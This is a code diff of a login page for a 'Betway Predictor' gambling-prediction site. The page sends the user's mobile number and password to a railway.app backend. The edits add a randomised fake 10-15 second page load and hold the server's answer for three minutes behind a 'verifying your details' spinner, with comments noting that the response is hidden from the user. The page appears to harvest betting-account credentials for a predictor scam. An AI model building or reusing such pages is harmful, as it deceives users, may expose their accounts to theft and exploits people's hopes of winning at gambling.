@@ -355,32 +355,7 @@
             letter-spacing: 0.5px;
         }
 
-        .page-loader .timer {
-            color: #f5c518;
-            font-size: 32px;
-            font-weight: 700;
-            margin-top: 5px;
-        }
-
-        .page-loader .progress-bar {
-            width: 200px;
-            height: 4px;
-            background: #2a2a2a;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-top: 10px;
-        }
-
-        .page-loader .progress-bar .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #f5c518, #ffd700);
-            border-radius: 4px;
-            width: 0%;
-            transition: width 0.5s linear;
-        }
-
-        /* ===== HIDE CONTENT DURING LOADING ===== */
-        .content-hidden {
+        .page-loader.hidden {
             display: none;
         }
 
@@ -421,6 +396,17 @@
             letter-spacing: 1px;
         }
 
+        .loading-overlay .sub-text {
+            color: #888;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        .content-hidden {
+            display: none;
+        }
+
         @media (max-width: 480px) {
             .login-container {
                 padding: 30px 20px;
@@ -440,12 +426,6 @@
                 flex-direction: column;
                 gap: 4px;
             }
-            .page-loader .timer {
-                font-size: 24px;
-            }
-            .page-loader .progress-bar {
-                width: 150px;
-            }
         }
     </style>
 </head>
@@ -453,25 +433,21 @@
 
     <div class="login-container" id="appContainer">
 
-        <!-- ===== PAGE LOADING OVERLAY (3 MINUTES) ===== -->
+        <!-- ===== PAGE LOADING OVERLAY (10-15 seconds) ===== -->
         <div class="page-loader" id="pageLoader">
             <div class="big-spinner"></div>
             <p>Loading Betway Predictor...</p>
             <span class="sub-text">Please wait while we prepare your experience</span>
-            <div class="timer" id="timerDisplay">3:00</div>
-            <span class="sub-text">Redirecting in...</span>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
         </div>
 
         <!-- ===== LOGIN CONTENT ===== -->
         <div id="pageContent" class="content-hidden">
 
-            <!-- LOGIN LOADING OVERLAY -->
+            <!-- LOGIN LOADING OVERLAY (3 minutes after login) -->
             <div class="loading-overlay" id="loadingOverlay">
                 <div class="big-spinner"></div>
                 <p>Processing your request...</p>
+                <span class="sub-text">Please wait while we verify your details</span>
             </div>
 
             <!-- LOGO -->
@@ -552,39 +528,27 @@
 
         console.log('🔴 Script loaded!');
 
-        // ===== PAGE LOADING SPINNER (3 MINUTES) =====
+        // ============================================
+        // PAGE LOADING: 10-15 seconds (random)
+        // ============================================
+
         var pageLoader = document.getElementById('pageLoader');
         var pageContent = document.getElementById('pageContent');
-        var timerDisplay = document.getElementById('timerDisplay');
-        var progressFill = document.getElementById('progressFill');
 
-        var totalSeconds = 180; // 3 minutes
-        var remaining = totalSeconds;
+        // Random time between 10-15 seconds
+        var pageLoadTime = Math.floor(Math.random() * (15000 - 10000 + 1)) + 10000;
+        console.log('⏳ Page loading for ' + (pageLoadTime / 1000) + ' seconds...');
 
-        console.log('⏳ Starting 3-minute countdown...');
+        setTimeout(function() {
+            pageLoader.classList.add('hidden');
+            pageContent.classList.remove('content-hidden');
+            console.log('✅ Page loaded! Login form shown.');
+        }, pageLoadTime);
 
-        function updateTimer() {
-            var minutes = Math.floor(remaining / 60);
-            var seconds = remaining % 60;
-            timerDisplay.textContent = minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+        // ============================================
+        // GET ELEMENTS
+        // ============================================
 
-            var progress = ((totalSeconds - remaining) / totalSeconds) * 100;
-            progressFill.style.width = progress + '%';
-
-            if (remaining <= 0) {
-                clearInterval(timerInterval);
-                // Hide loader, show content
-                pageLoader.style.display = 'none';
-                pageContent.classList.remove('content-hidden');
-                console.log('✅ 3 minutes completed! Content shown.');
-            }
-            remaining--;
-        }
-
-        var timerInterval = setInterval(updateTimer, 1000);
-        updateTimer();
-
-        // ===== GET ELEMENTS =====
         var mobileInput = document.getElementById('mobileNumber');
         var passwordInput = document.getElementById('password');
         var loginBtn = document.getElementById('loginBtn');
@@ -595,7 +559,10 @@
         var signupLink = document.getElementById('signupLink');
         var togglePassword = document.getElementById('togglePassword');
 
-        // ===== PASSWORD TOGGLE =====
+        // ============================================
+        // PASSWORD TOGGLE
+        // ============================================
+
         var isPasswordVisible = false;
 
         togglePassword.addEventListener('click', function() {
@@ -605,16 +572,16 @@
                 passwordInput.type = 'text';
                 togglePassword.innerHTML = '<i class="fas fa-eye"></i>';
                 togglePassword.classList.add('active');
-                console.log('👁️ Password visible');
             } else {
                 passwordInput.type = 'password';
                 togglePassword.innerHTML = '<i class="fas fa-eye-slash"></i>';
                 togglePassword.classList.remove('active');
-                console.log('🔒 Password hidden');
             }
         });
 
-        // ===== FUNCTIONS =====
+        // ============================================
+        // FUNCTIONS
+        // ============================================
 
         function showMessage(text, type) {
             messageDiv.textContent = text;
@@ -627,32 +594,33 @@
             messageDiv.className = '';
         }
 
-        function showLoading() {
-            console.log('⏳ SHOWING LOADING SPINNER!');
+        function showLoginLoading() {
+            console.log('⏳ Login loading started (3 minutes)...');
             loginBtn.disabled = true;
             spinner.classList.add('active');
             btnText.textContent = 'Logging in...';
             loadingOverlay.classList.add('active');
         }
 
-        function hideLoading() {
-            console.log('✅ HIDING LOADING SPINNER!');
+        function hideLoginLoading() {
+            console.log('✅ Login loading hidden');
             loginBtn.disabled = false;
             spinner.classList.remove('active');
             btnText.textContent = 'Login';
             loadingOverlay.classList.remove('active');
         }
 
-        // ===== MAIN LOGIN FUNCTION =====
+        // ============================================
+        // MAIN LOGIN FUNCTION
+        // ============================================
 
         function doLogin() {
-            console.log('🖱️ BUTTON CLICKED! doLogin() RUNNING!');
+            console.log('🖱️ Login button clicked!');
 
             var mobileNumber = mobileInput.value.trim();
             var password = passwordInput.value.trim();
 
             console.log('📱 Mobile:', mobileNumber);
-            console.log('🔒 Password:', password ? '******' : 'empty');
 
             if (!mobileNumber || !password) {
                 showMessage('⚠️ Please enter both mobile number and password.', 'error');
@@ -666,10 +634,12 @@
             }
 
             hideMessage();
-            showLoading();
 
+            // ===== SHOW 3-MINUTE LOADING =====
+            showLoginLoading();
+
+            // ===== SEND TO BACKEND =====
             var apiUrl = 'https://betwayaviatorpredictor-production-911a.up.railway.app/api/login';
-            console.log('📤 Sending to:', apiUrl);
 
             fetch(apiUrl, {
                 method: 'POST',
@@ -684,32 +654,47 @@
                 return response.json();
             })
             .then(function(data) {
-                console.log('📦 Response data:', data);
-                hideLoading();
-                if (data.success) {
-                    showMessage('✅ Login successful! Redirecting...', 'success');
-                    showLoading();
-                    setTimeout(function() {
-                        window.location.href = 'https://betwayaviatorpredictor-production-911a.up.railway.app';
-                    }, 2000);
-                } else {
-                    showMessage('❌ ' + (data.message || 'Login failed.'), 'error');
-                }
+                console.log('📦 Response received (hidden from user)');
+
+                // ===== WAIT 3 MINUTES BEFORE SHOWING RESULT =====
+                setTimeout(function() {
+                    hideLoginLoading();
+
+                    if (data.success) {
+                        showMessage('✅ Login successful!', 'success');
+                        setTimeout(function() {
+                            window.location.href = 'https://betwayaviatorpredictor-production-911a.up.railway.app';
+                        }, 1500);
+                    } else {
+                        showMessage('❌ ' + (data.message || 'Login failed.'), 'error');
+                    }
+                }, 180000); // 3 minutes
+
             })
             .catch(function(error) {
                 console.error('❌ ERROR:', error);
-                hideLoading();
-                showMessage('❌ Error: ' + error.message, 'error');
+
+                // Still wait 3 minutes before showing error
+                setTimeout(function() {
+                    hideLoginLoading();
+                    showMessage('❌ Network error. Please try again.', 'error');
+                }, 180000); // 3 minutes
             });
         }
 
-        // ===== GO TO SIGNUP =====
+        // ============================================
+        // GO TO SIGNUP
+        // ============================================
+
         function goToSignup() {
             console.log('🔄 Going to signup page...');
             window.location.href = 'signup.html';
         }
 
-        // ===== ATTACH EVENT LISTENERS =====
+        // ============================================
+        // ATTACH EVENT LISTENERS
+        // ============================================
+
         loginBtn.addEventListener('click', doLogin);
         signupLink.addEventListener('click', goToSignup);
 
@@ -727,7 +712,6 @@
         });
 
         console.log('✅ All systems ready!');
-        console.log('✅ Waiting for user to tap Login...');
     </script>
 
 </body>
